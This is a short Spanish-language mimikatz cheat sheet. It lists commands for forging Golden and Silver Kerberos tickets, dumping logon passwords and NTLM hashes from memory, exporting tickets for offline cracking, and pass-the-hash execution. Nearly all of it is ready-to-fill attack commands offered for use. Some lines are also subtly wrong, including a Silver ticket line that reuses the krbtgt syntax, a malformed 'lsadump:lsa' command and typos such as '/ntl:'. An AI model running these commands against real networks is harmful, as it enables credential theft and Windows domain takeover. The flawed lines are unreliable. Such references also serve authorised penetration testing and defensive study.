# mimikatz



```
 /$$      /$$ /$$               /$$ /$$                   /$$             
| $$$    /$$$|__/              |__/| $$                  | $$             
| $$$$  /$$$$ /$$ /$$$$$$/$$$$  /$$| $$   /$$  /$$$$$$  /$$$$$$  /$$$$$$$$
| $$ $$/$$ $$| $$| $$_  $$_  $$| $$| $$  /$$/ |____  $$|_  $$_/ |____ /$$/
| $$  $$$| $$| $$| $$ \ $$ \ $$| $$| $$$$$$/   /$$$$$$$  | $$      /$$$$/ 
| $$\  $ | $$| $$| $$ | $$ | $$| $$| $$_  $$  /$$__  $$  | $$ /$$ /$$__/  
| $$ \/  | $$| $$| $$ | $$ | $$| $$| $$ \  $$|  $$$$$$$  |  $$$$//$$$$$$$$
|__/     |__/|__/|__/ |__/ |__/|__/|__/  \__/ \_______/   \___/ |________/
                                                                          
                                                                          
```

#### Ejecución en una sola linea

```csharp
mimikatz.exe "privilege::debug" "<comando>" exit
```

#### Crea un Golden Ticket

```python
mimikatz # Kerberos::golden /user:<Usuario> /domain:<domain> /sid:<SID del Usuario> /krbtgt:<NTLM> /id:500
```

#### Crea un Silver ticket

```
mimikatz # Kerberos::golden /user:<Usuario> /domain:<domain> /sid:<SID del Usuario> /krbtgt:<NTLM> /id:1103
```

#### Ejecutar comando con el ticket previo creado

```
mimikatz # misc::cmd
```

*   **sekurlsa::logonpasswords**: Obtiene las contraseñas de los usuarios autenticados

    * NTLM
    * SHA1
    * \[DPAPI]


* **lsadump:lsa /patch**: Obtiene los hash de los usuarios
  * LM
  * NTLM
* `lsadump::lsa /inject /name:krbtgt: Obtiene los identificados y hashes para crear un GoldenTicket`
* **sekurlsa::tickets**: Obtiene los TGS y TGT.
* **kerberos::list**: Obtiene las cuentas de servicio kerberos.
  * /export: Almacena los TGT y TGS en un archivo para después crackearlo
    * hashcat
    * tgsrepcrak.py
* **misc::cmd**: Ejecuta una consola de comandos

#### Golden Ticket

```csharp
import-module .\PowerView.ps1;Get-DomainSID  # Obtiene el SID del Dominio
kerberos::golden /user:<fakeuser> /domain:<Dominio> /sid:<SID Dominio> /krbtgt:<SID krbtgt> /ptt
```

#### Pass-The-Hash

```csharp
privilege::debug
sekurlsa::pth /user:<user> /domain:<domain> /ntl:<HASH> 
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<HASH> /run:<command>privile
```
